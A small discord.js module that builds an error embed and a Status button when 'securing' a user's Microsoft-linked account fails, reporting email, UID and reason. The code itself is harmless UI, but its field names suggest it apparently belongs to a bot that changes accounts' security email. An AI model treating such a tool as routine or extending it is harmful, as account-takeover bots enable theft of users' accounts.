const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

async function failedembed(acc, uid) {
    let failed = false;
    let reason = "Unknown";

    if (acc.secEmail === "unauthed") {
        failed = true;
        reason = "unauthed";
    }

    if (acc.secEmail === "Locked!") {
        failed = true;
        reason = "locked (maybe phone)";
    }

    if (acc.secEmail === "Microsoft services are down!") {
        failed = true;
        reason = "down";
    }

    if (!failed) {
        return {
            failed: false,
            msg: null
        };
    }

    const invalidEmails = ["Microsoft services are down!", "Locked!", "unauthed"];
    const hasemail = acc.email && !invalidEmails.includes(acc.email) ? acc.email : "Unknown";

    const embed = new EmbedBuilder()
        .setTitle("Something went wrong whilst securing your account")
        .setDescription("The status will still work so you can check if it did anything")
        .addFields(
            { name: "Email", value: `\`\`\`${hasemail}\`\`\`` },
            { name: "UID", value: `\`\`\`${uid}\`\`\`` },
            { name: "Error", value: `\`\`\`${reason}\`\`\`` }
        )
        .setColor(0xFF0000);

    const components = [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`status|${uid}`)
                .setLabel('⏳ Status')
                .setStyle(ButtonStyle.Primary)
        )
    ];

    return {
        failed: true,
        failedmsg: {
            embeds: [embed],
            components,
            ephemeral: true
        }
    };
}

module.exports = { failedembed };
